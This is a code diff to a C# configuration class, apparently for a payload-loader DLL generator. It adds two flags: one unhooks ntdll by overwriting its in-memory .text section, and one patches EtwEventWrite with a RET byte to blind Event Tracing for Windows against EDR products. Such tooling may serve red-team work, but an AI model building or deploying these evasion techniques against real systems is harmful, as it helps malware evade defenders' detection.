@@ -19,6 +19,22 @@ public class TemplateConfig
     // sc_NtFoo() wrapper names, so generator callsites that emit those calls
     // can branch on this single flag instead of repeating (Direct || Indirect).
     public bool AnySyscalls => DirectSyscalls || IndirectSyscalls;
+
+    // When set, the generator emits a call to unhook_ntdll() at the very
+    // start of DllMain (before sc_init / sc_delay / payload). The unhook
+    // procedure maps a fresh copy of ntdll.dll from disk and overwrites the
+    // in-process .text section, removing any user-mode hooks an EDR may have
+    // installed. Arch-independent. See templates/unhook.h for the full
+    // implementation and limitations.
+    public bool UnhookNtdll { get; set; }
+
+    // When set, the generator emits a call to patch_etw() right after
+    // unhook_ntdll (so a prior unhook doesn't undo this patch). The patch
+    // overwrites the first byte of ntdll!EtwEventWrite with 0xC3 (RET),
+    // blinding the Event Tracing for Windows channel that several EDRs
+    // subscribe to (notably Microsoft-Windows-Threat-Intelligence).
+    // Arch-independent — RET is 0xC3 on x64 and x86 alike.
+    public bool PatchEtw { get; set; }
     public int DelayMs { get; set; }
     public PayloadType Payload { get; set; } = PayloadType.MessageBox;
     public string PayloadData { get; set; } = "";
